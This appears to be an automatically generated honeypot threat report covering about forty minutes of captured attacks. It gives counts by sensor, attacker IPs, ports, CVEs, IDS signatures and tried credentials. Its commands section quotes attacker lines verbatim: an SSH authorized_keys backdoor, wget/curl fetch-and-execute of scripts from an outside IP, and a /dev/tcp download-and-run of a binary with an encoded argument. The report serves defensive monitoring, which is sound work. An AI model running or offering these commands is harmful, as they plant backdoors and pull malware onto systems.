
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-05T04:01:37Z
**Timeframe:** 2025-10-05T03:20:01Z to 2025-10-05T04:00:01Z
**Log Files:** agg_log_20251005T032001Z.json, agg_log_20251005T034001Z.json, agg_log_20251005T040001Z.json

## Executive Summary

This report summarizes 14,211 observed events across the honeypot network. The majority of attacks were captured by the Cowrie honeypot, indicating a high volume of SSH and Telnet-based brute force and command injection attempts. The most frequent attacker IP was 170.64.185.131. A significant number of activities targeted port 22 (SSH) and port 25 (SMTP). Analysis of command execution reveals coordinated attempts to install SSH keys for persistent access and perform system reconnaissance. Several CVEs were noted, with CVE-2005-4050 being the most common.

## Detailed Analysis

### Attacks by Honeypot
- Cowrie: 8471
- Ciscoasa: 1462
- Honeytrap: 1471
- Suricata: 1151
- Mailoney: 813
- Sentrypeer: 516
- Dionaea: 139
- Redishoneypot: 51
- H0neytr4p: 44
- Tanner: 32
- Adbhoney: 19
- Honeyaml: 16
- Dicompot: 10
- ConPot: 6
- ElasticPot: 4
- Heralding: 3
- ssh-rsa: 2
- Ipphoney: 1

### Top Attacking IPs
- 170.64.185.131: 1310
- 40.82.137.99: 1252
- 176.65.141.117: 793
- 45.78.196.99: 901
- 51.75.194.10: 307
- 206.238.115.230: 267
- 213.6.203.226: 272
- 172.86.95.98: 266
- 34.91.0.68: 266
- 202.143.111.141: 207
- 107.170.232.33: 207
- 200.1.218.25: 219
- 132.164.221.42: 228
- 163.44.173.168: 208
- 64.227.138.208: 182
- 182.18.139.237: 159
- 103.139.59.214: 164
- 103.172.237.182: 150
- 103.123.53.92: 144
- 198.12.68.114: 111

### Top Targeted Ports/Protocols
- 22: 1242
- 25: 810
- 5060: 516
- 3306: 106
- UDP/5060: 66
- 6379: 45
- TCP/22: 48
- 443: 44
- 80: 40
- 23: 39
- 3128: 48
- 1723: 19
- 1434: 35
- TCP/80: 40
- 2222: 13
- TCP/443: 10
- TCP/1080: 15
- TCP/3128: 9
- 8888: 8
- 5672: 8

### Most Common CVEs
- CVE-2024-4577 CVE-2002-0953
- CVE-1999-0183
- CVE-2002-0013 CVE-2002-0012
- CVE-2001-0414
- CVE-2021-42013 CVE-2021-42013
- CVE-2024-3721 CVE-2024-3721
- CVE-2005-4050
- CVE-2021-3449 CVE-2021-3449
- CVE-2021-41773 CVE-2021-41773 CVE-2021-41773 CVE-2021-41773
- CVE-2024-4577 CVE-2024-4577

### Commands Attempted by Attackers
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- cat /proc/cpuinfo | grep name | wc -l
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m
- cat /proc/cpuinfo | grep model | grep name | wc -l
- top
- uname
- uname -a
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- Enter new UNIX password: 
- Enter new UNIX password:
- tftp; wget; /bin/busybox NPYHY
- cd /data/local/tmp/; busybox wget http://185.237.253.28/w.sh; sh w.sh; curl http://185.237.253.28/c.sh; sh c.sh; wget http://185.237.253.28/wget.sh; sh wget.sh; curl http://185.237.253.28/wget.sh; sh wget.sh; busybox wget http://185.237.253.28/wget.sh; sh wget.sh; busybox curl http://185.237.253.28/wget.sh; sh wget.sh
- nohup bash -c "exec 6<>/dev/tcp/8.219.12.33/60118 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/Gnins9nsMi && chmod +x /tmp/Gnins9nsMi && /tmp/Gnins9nsMi xonMMceJz8yJzTPEkc7PlsYgxonMz5/QNMaJz82exDbOlszGh88wyInJy4nMMsyJzM6WxDbOlszHh8oz0JbOzonKM9CWxsadyDDPl8jek8kuzJTH0JXMNdCfzcSRzjHMl97KkNA4zYnG0JbOOsiXz8yT3jjQlc/Oicw1zInGx53IMM+Tyd6TyS7MlMnQls010JHMxJHOMc6U3sqU0DHOl9DHic81zp3IzpbOM96TydCVzTjQlsbMic8yz53IzpbMMNtZ+rQE/iUH" &

### Signatures Triggered
- ET DROP Dshield Block Listed Source group 1: 341
- 2402000: 341
- ET SCAN NMAP -sS window 1024: 105
- 2009582: 105
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 70
- 2023753: 70
- ET INFO Reserved Internal IP Traffic: 50
- 2002752: 50
- ET VOIP MultiTech SIP UDP Overflow: 52
- 2003237: 52
- ET SCAN Potential SSH Scan: 40
- 2001219: 40
- ET HUNTING RDP Authentication Bypass Attempt: 32
- 2034857: 32
- ET CINS Active Threat Intelligence Poor Reputation IP group 46: 17
- 2403345: 17
- GPL INFO SOCKS Proxy attempt: 8
- 2100615: 8
- ET CINS Active Threat Intelligence Poor Reputation IP group 49: 9
- 2403348: 9
- ET CINS Active Threat Intelligence Poor Reputation IP group 47: 9
- 2403346: 9
- ET CINS Active Threat Intelligence Poor Reputation IP group 50: 8
- 2403349: 8
- ET CINS Active Threat Intelligence Poor Reputation IP group 45: 9
- 2403344: 9
- ET INFO CURL User Agent: 9
- 2002824: 9
- ET HUNTING Mozilla User-Agent (Mozilla/5.0) Inbound Likely Fake: 9
- 2010908: 9

### Users / Login Attempts
- crypto/: 102
- 345gs5662d34/345gs5662d34: 35
- novinhost/novinhost.org: 11
- root/nPSpP4PBW0: 14
- root/LeitboGi0ro: 7
- test/zhbjETuyMffoL8F: 7
- root/3245gs5662d34: 8
- novinhost/3245gs5662d34: 4
- root/toor: 3
- awsgui/awsgui: 3
- wang/wang: 3
- nexus/nexus: 3
- es/es123: 3
- root/P@ssw0rd: 2
- debianuser/debian10svm: 2
- nginx/nginx: 2
- root/Passw0rd: 2
- chenjj/chenjj: 2
- elastic/elastic: 2
- bot/1234: 2

### Files Uploaded/Downloaded
- sh: 90
- json: 9
- wget.sh;: 4
- w.sh;: 1
- c.sh;: 1

### HTTP User-Agents
- None observed

### SSH Clients
- None observed

### SSH Servers
- None observed

### Top Attacker AS Organizations
- None observed

## Key Observations and Anomalies

- **Persistent SSH Key Installation:** A recurring pattern involves attackers attempting to remove existing SSH configurations and install their own `authorized_keys` file. This indicates a clear objective to establish persistent, passwordless access to compromised systems.
- **System Reconnaissance:** The set of executed commands (`uname`, `lscpu`, `free`, etc.) is standard for initial system enumeration, where attackers gather information about the environment's architecture and resources.
- **Payload Delivery via Multiple Protocols:** Attackers were observed using `wget` and `curl` to download and execute shell scripts (e.g., w.sh, c.sh), and one command attempted to establish a reverse shell using `/dev/tcp`. This multi-pronged approach increases the likelihood of a successful payload delivery.
- **High Volume of Scanning:** A large number of Suricata alerts for "NMAP -sS" and "Potential SSH Scan" from a wide range of IPs suggests the honeypot is being continuously targeted by broad, automated scanning campaigns.
